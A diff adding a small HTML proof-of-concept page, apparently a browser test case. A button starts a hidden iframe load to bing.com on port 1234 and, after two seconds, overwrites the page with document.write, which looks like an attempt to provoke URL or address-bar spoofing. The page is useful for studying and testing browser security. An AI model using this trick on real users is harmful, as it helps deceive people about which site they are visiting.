@@ -1,0 +1,33 @@
+<html>
+<head>
+  <title>Proof of Concept</title>
+</head>
+<body>
+<script>  
+  function spoof() {
+    // Set a timeout to stop loading after 2 seconds (2000 milliseconds)
+    var timeout = setTimeout(function() {
+      document.write("<h1>Loading stopped</h1>");
+    }, 2000);
+    
+    // Try to load the URL
+    var iframe = document.createElement("iframe");
+    iframe.src = "https://bing.com:1234";
+    iframe.style.display = "none";
+    
+    // When the iframe is loaded or failed to load, clear the timeout
+    iframe.onload = iframe.onerror = function() {
+      clearTimeout(timeout);
+    };
+    
+    // Append the iframe to the body
+    document.body.appendChild(iframe);
+  }
+</script> 
+
+<p class="test">
+  <input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
+</p>
+
+</body>
+</html>
